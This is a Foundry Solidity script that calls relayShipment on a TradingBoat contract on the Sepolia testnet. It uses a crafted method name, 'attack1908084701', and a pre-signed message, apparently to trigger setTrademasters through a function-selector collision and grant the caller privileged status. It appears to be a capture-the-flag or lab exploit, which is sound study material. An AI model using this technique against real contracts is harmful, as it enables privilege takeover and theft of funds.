// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Script, console2} from "forge-std/Script.sol";
import "../contracts/TradingBoat.sol";
import "../contracts/TradingData.sol";

// forge script scripts/RelayShipment.s.sol --rpc-url sepolia --broadcast 
contract RelayShipmentScript is Script {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public  {
        vm.startBroadcast(deployerPrivateKey);
        TradingBoat tradingBoat = TradingBoat(0x871A6C16D8BC5ECA345c697b4aA1CDe4BF95341e);

        uint64 _chainId;
        string memory _method = "attack1908084701";
        bytes32[] memory _args = new bytes32[](1);
        _args[0] = bytes32(uint256(uint160(0x26d403E1E1A1239d8b6f5907dE272CF311104753))); // address to input in setTrademasters(address[])
        uint64 _fromChainId = 43113; //fuji
        uint64 _toChainId = 11155111; //sepolia
        address _fromContract = 0x26d403E1E1A1239d8b6f5907dE272CF311104753; // fuji msg.sender
        address _toContract = 0x39eEddbBD4D133c3fcb0fD7B971f807Fc3552569; // sepolia TradingData

        bytes memory _signature = hex"dfcb71ad5b91bbcb5818aab6c9319c7e025b331bcb1f54bd1082253e29601f3571a06c46d4ca69e33604c6dff656f23eeda01932398ff6f4a50bbc9bcc3041671b";
        tradingBoat.relayShipment(_method, _args, _fromChainId, _fromContract, _toContract, _signature);
        vm.stopBroadcast();
    }
}